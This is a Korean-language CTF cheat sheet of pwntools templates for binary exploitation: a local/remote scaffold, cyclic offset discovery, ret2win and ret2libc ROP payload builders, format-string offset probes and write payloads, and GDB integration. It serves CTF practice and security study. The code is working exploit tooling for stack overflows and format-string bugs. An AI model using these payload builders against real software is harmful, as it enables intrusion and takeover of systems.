# 바이너리 익스플로잇 베이스 (pwntools) — CTF

허가된 CTF/연구 전제. `pip install pwntools`. 로컬/원격 실습 대상.

## pwntools 스캐폴드 (로컬/원격 전환)
```python
from pwn import context, process, remote, ELF, args

context.arch = "amd64"
context.log_level = "info"

def start():
    if args.REMOTE:                      # python exp.py REMOTE HOST PORT
        return remote(args.HOST, int(args.PORT))
    return process("./vuln")

elf = ELF("./vuln", checksec=False)
io = start()
```

## cyclic 패턴으로 오프셋 찾기
```python
from pwn import cyclic, cyclic_find, p64

def find_offset(create_crash) -> int:
    pattern = cyclic(200)
    rsp_value = create_crash(pattern)    # 크래시 시 덮인 4~8바이트(리틀엔디언) 반환
    return cyclic_find(rsp_value)

def build_ret_payload(offset: int, ret_addr: int) -> bytes:
    return b"A" * offset + p64(ret_addr)
```

## ret2win / 간단 ROP
```python
from pwn import ELF, p64, flat

def ret2win(offset: int, win_addr: int) -> bytes:
    ret = 0x40101a                       # ret 가젯(스택정렬용, objdump로 확보)
    return flat({offset: [ret, win_addr]})

def ret2libc(offset: int, pop_rdi: int, binsh: int, system: int) -> bytes:
    ret = pop_rdi + 1                    # 정렬용 ret
    return flat({offset: [ret, pop_rdi, binsh, system]})
```

## 포맷스트링 오프셋 탐지
```python
def fmt_offset_probe() -> list[str]:
    # 각 payload를 보내 "41414141.<N>" 형태로 입력 위치 확인.
    return [f"AAAA%{i}$p" for i in range(1, 20)]

def fmt_write(target_addr: int, value: int, offset: int) -> bytes:
    from pwn import fmtstr_payload
    return fmtstr_payload(offset, {target_addr: value})
```

## GDB 디버깅 연동
```python
from pwn import gdb, process

def debug_start(binary: str, breakpoints: list[str]):
    script = "\n".join(f"break {b}" for b in breakpoints) + "\ncontinue\n"
    return gdb.debug([binary], gdbscript=script)
```
